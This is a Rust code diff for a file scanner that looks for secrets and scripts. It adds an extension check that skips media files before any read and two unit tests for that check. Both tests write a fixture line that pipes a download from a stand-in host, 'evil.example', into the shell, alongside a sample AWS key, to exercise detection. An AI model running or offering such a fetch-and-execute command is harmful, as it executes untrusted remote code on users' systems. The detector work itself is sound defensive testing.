@@ -93,6 +93,16 @@ fn looks_like_edamame_powershell_probe_stub(basename: &str, normalized: &str) ->
 }
 
 pub fn inspect_secret_like_file(path: &str) -> Option<SecretContentFileMatch> {
+    // Extension gate FIRST, before any filesystem access. Binary/media files
+    // (audio, images, video, archives, compiled artifacts, on-disk media
+    // databases) never carry secret text, and probing them under TCC-protected
+    // media directories (`~/Music`, `~/Pictures`, `~/Movies`) triggers a macOS
+    // privacy consent prompt. Dropping on extension here guarantees no
+    // `metadata()` / `open()` on such a candidate regardless of caller.
+    if vuln_detector_params::is_secret_content_scan_skipped_extension(path) {
+        return None;
+    }
+
     let metadata = fs::metadata(path).ok()?;
     if !metadata.is_file() || metadata.len() == 0 {
         return None;
@@ -269,6 +279,40 @@ mod tests {
         assert!(
             !scan.network_command_like,
             "bare URL in OpenSSH warning text must not be network-command-like (got: {scan:?})"
+        );
+        cleanup(&path);
+    }
+
+    /// The extension gate MUST drop binary/media candidates before any
+    /// content read. A `.mp3` file whose bytes happen to contain
+    /// script-like / secret-like text (which real media files can, via
+    /// embedded metadata) must return `None` -- the scanner never opens it.
+    /// This is the TCC-prompt fix for media assets held open under
+    /// `~/Music` / `~/Pictures` / `~/Movies`.
+    #[test]
+    fn media_extension_is_skipped_before_read() {
+        let path = unique_path("fake_media", ".mp3");
+        // Content that WOULD be flagged if it were scanned as text.
+        write_temp(&path, "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n");
+        let scan = inspect_secret_like_file(&path);
+        assert!(
+            scan.is_none(),
+            "media-extension file must be skipped by the extension gate (got: {scan:?})"
+        );
+        cleanup(&path);
+    }
+
+    /// Companion positive control: the SAME secret-like content in a
+    /// non-media extension is still scanned (proves the gate is scoped to
+    /// the extension, not a blanket suppression).
+    #[test]
+    fn non_media_extension_with_same_content_is_scanned() {
+        let path = unique_path("real_script", ".sh");
+        write_temp(&path, "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n");
+        let scan = inspect_secret_like_file(&path).expect("non-media file must be scanned");
+        assert!(
+            scan.script_like || scan.network_command_like || scan.secret_hits > 0,
+            "non-media payload must produce a signal (got: {scan:?})"
         );
         cleanup(&path);
     }
